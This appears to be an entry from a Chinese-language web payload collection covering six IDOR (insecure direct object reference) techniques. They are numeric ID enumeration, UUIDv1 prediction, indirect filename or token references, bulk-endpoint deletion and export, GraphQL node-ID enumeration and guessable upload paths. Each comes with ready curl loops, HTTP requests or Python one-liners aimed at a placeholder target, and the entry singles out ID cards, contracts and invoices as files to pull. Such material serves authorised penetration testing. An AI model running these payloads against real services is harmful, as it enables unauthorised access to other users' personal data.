# IDOR / 越权访问 (Insecure Direct Object Reference)

_6 条 web payload_

---

### 数字 ID 枚举  `idor-numeric-id`
_修改 URL/参数中的数字 ID 访问他人资源_
子类：**水平越权** · tags: `idor` `horizontal` `id`

**前置条件：**
- 资源以可预测数字 ID 标识
- 后端未校验当前用户是否拥有该资源

**攻击链：**

**1. 注册两个账号 A / B，记录各自资源 ID**
```bash
# 用账号 A 的 token 访问账号 B 的资源
curl -s https://target.com/api/orders/1002 \
  -H "Authorization: Bearer <A_token>"

# 若返回 B 的数据 = IDOR confirmed
```

**2. 批量验证（最多取 3 条证据即停）**
```bash
for id in 1001 1002 1003; do
  curl -s -o /dev/null -w "%{http_code} id=$id\n" \
    https://target.com/api/orders/$id \
    -H "Authorization: Bearer <A_token>"
done
```

---

### UUID 预测/碰撞  `idor-uuid`
_UUID 看似随机但生成方式可预测_
子类：**ID 预测** · tags: `idor` `uuid` `sequential`

**攻击链：**

```bash
# 收集多个 UUID，检查是否有规律
# UUIDv1 含时间戳，可推算其他用户的 UUID
python3 -c "
import uuid, time
# UUIDv1 基于 MAC+时间，相近时间注册的用户 UUID 相似
u = uuid.uuid1()
print(u, hex(u.time))
"

# 工具: uuid-bruteforce, uuidv1-cracker
```

---

### 间接对象引用  `idor-indirect`
_资源通过间接标识符引用，修改中间参数_
子类：**间接越权** · tags: `idor` `indirect`

**攻击链：**

```bash
# 场景：文件下载通过 filename 而非 file_id
GET /download?file=report_user123.pdf
# 尝试
GET /download?file=report_user456.pdf

# 场景：邮件/通知通过 token 引用
GET /verify?token=abc123
# 枚举 token
```

---

### 批量操作 IDOR  `idor-bulk`
_批量接口未逐条鉴权_
子类：**批量越权** · tags: `idor` `bulk` `array`

**攻击链：**

```bash
# 单条有鉴权，批量接口忘了
POST /api/messages/bulk-delete
{"ids": [101, 102, 999]}  # 999 是他人消息

POST /api/export
{"user_ids": [1, 2, 3, 4, 5]}  # 导出他人数据
```

---

### GraphQL IDOR  `idor-graphql`
_GraphQL query 通过 node ID 访问任意对象_
子类：**GraphQL越权** · tags: `idor` `graphql`

**攻击链：**

```graphql
# 枚举 node ID
query {
  node(id: "VXNlcjoxMjM=") {  # base64: User:123
    ... on User { email phone }
  }
}

# 修改 base64 中的数字遍历
python3 -c "import base64; print(base64.b64encode(b'User:456').decode())"
```

---

### 文件/附件 IDOR  `idor-file`
_文件 URL 包含用户标识，可猜测他人文件路径_
子类：**文件越权** · tags: `idor` `file` `upload`

**攻击链：**

```bash
# 上传文件后观察返回 URL 结构
# https://cdn.target.com/uploads/user_123/avatar.jpg
# 尝试
# https://cdn.target.com/uploads/user_456/avatar.jpg
# https://cdn.target.com/uploads/user_456/id_card.jpg

# 关注: 合同、发票、身份证等敏感附件
```
